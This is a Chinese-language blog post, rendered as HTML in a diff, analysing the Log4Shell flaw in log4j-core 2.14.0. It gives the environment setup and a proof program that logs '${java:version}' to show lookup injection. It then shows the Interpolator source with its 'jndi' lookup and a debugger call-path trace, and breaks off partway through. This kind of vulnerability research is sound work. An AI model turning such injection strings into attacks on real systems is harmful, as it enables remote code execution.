@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"f19t.github.io.git","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="log4jshell-2.14.0漏洞分析这篇文章分析一下log4jshell的漏洞代码层面产生的原因。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="log4jshell-2.14.0漏洞分析">
+<meta property="og:url" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="个人博客">
+<meta property="og:description" content="log4jshell-2.14.0漏洞分析这篇文章分析一下log4jshell的漏洞代码层面产生的原因。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790403862086.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790406217011.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790407461241.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790408494938.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790409053804.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790410030429.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790415878786.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790418651892.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790428038870.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790429142937.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790434101896.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790436727911.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790437478732.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790438639330.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790440268620.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790440670210.jpg">
+<meta property="article:published_time" content="2023-03-17T09:39:55.000Z">
+<meta property="article:modified_time" content="2023-03-17T09:42:32.036Z">
+<meta property="article:author" content="f19t">
+<meta property="article:tag" content="JAVASEC">
+<meta property="article:tag" content="log4j2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790403862086.jpg">
+
+<link rel="canonical" href="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>log4jshell-2.14.0漏洞分析 | 个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="f19t">
+      <meta itemprop="description" content="个人学习的一些记录。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          log4jshell-2.14.0漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-17 17:39:55 / 修改时间：17:42:32" itemprop="dateCreated datePublished" datetime="2023-03-17T17:39:55+08:00">2023-03-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="log4jshell-2-14-0漏洞分析"><a href="#log4jshell-2-14-0漏洞分析" class="headerlink" title="log4jshell-2.14.0漏洞分析"></a>log4jshell-2.14.0漏洞分析</h2><p>这篇文章分析一下log4jshell的漏洞代码层面产生的原因。</p>
+<span id="more"></span>
+
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul>
+<li>java version “1.8.0_152”</li>
+<li>idea 2023.3.3</li>
+<li>log4j-core 2.14.0</li>
+</ul>
+<hr>
+<p>手工创建环境过程：</p>
+<ul>
+<li><p>首先在pom.xml里面添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>第二步在resources文件夹下添加log4j2.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> &gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            配置Console的模式布局--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第三步我们写一个简单的验证程序</p>
+</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/3/16 18:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Test.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String a=<span class="string">&quot;$&#123;java:version&#125;&quot;</span>;</span><br><span class="line">        logger.error(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行这个Test将会得到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>-<span class="number">03</span>-<span class="number">17</span> <span class="number">15</span>:<span class="number">12</span>:<span class="number">04.362</span> [main] ERROR org.example.Test - Java version <span class="number">1.8</span><span class="number">.0_152</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞产生的位置在<font color=red>org.apache.logging.log4j.core.lookup.Interpolator.lookup()</font>方法。此方法存在一个strLookupMap，map内部的Key和value是我们利用的关键。里面有：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Interpolator</span><span class="params">(<span class="keyword">final</span> Map&lt;String, String&gt; properties)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="built_in">this</span>.defaultLookup = <span class="keyword">new</span> <span class="title class_">MapLookup</span>((Map)(properties == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">HashMap</span>() : properties));</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;log4j&quot;</span>, <span class="keyword">new</span> <span class="title class_">Log4jLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;sys&quot;</span>, <span class="keyword">new</span> <span class="title class_">SystemPropertiesLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;env&quot;</span>, <span class="keyword">new</span> <span class="title class_">EnvironmentLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;main&quot;</span>, MainMapLookup.MAIN_SINGLETON);</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;marker&quot;</span>, <span class="keyword">new</span> <span class="title class_">MarkerLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;java&quot;</span>, <span class="keyword">new</span> <span class="title class_">JavaLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;lower&quot;</span>, <span class="keyword">new</span> <span class="title class_">LowerLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;upper&quot;</span>, <span class="keyword">new</span> <span class="title class_">UpperLookup</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;jndi&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception | LinkageError var9) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;jndi&quot;</span>, var9);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;jvmrunargs&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception | LinkageError var8) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;jvmrunargs&quot;</span>, var8);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;date&quot;</span>, <span class="keyword">new</span> <span class="title class_">DateLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;ctx&quot;</span>, <span class="keyword">new</span> <span class="title class_">ContextMapLookup</span>());</span><br><span class="line">        <span class="keyword">if</span> (Constants.IS_WEB_APP) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;web&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.web.WebLookup&quot;</span>, StrLookup.class));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                <span class="built_in">this</span>.handleError(<span class="string">&quot;web&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;docker&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.docker.DockerLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;docker&quot;</span>, var6);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;spring&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;spring&quot;</span>, var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;kubernetes&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;kubernetes&quot;</span>, var3);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoClassDefFoundError var4) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;kubernetes&quot;</span>, var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在lookup方法的漏洞触发的位置位置下断点，我们跟进分析一下。<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790403862086.jpg"></p>
+<p>运行Test，断点位置的堆栈如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">223</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1116</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1038</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">345</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">543</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">502</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">485</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">460</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">82</span>, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2198</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2152</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2135</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2011</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">14</span>, Test (org.example)</span><br></pre></td></tr></table></figure>
+
+<p>我们一步一步的分析，首先调用<font color=red>logger.error(a);</font>，error又会调用<font color=red>logIfEnabled</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790406217011.jpg"><br>logIfEnabled又调用<font color=red>isEnabled</font>判断日志是否支持记录<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790407461241.jpg"><br><font color=red>isEnabled</font>又调用filter，这里的filter其实就是我们之前写的log4j2.xml的配置文件。<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790408494938.jpg"><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790409053804.jpg"></p>
+<p>判断可以记录之后调用<font color=red>logMessage</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790410030429.jpg"></p>
+<p>中间的过程就不分析了，一直到<font color=red>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790415878786.jpg"></p>
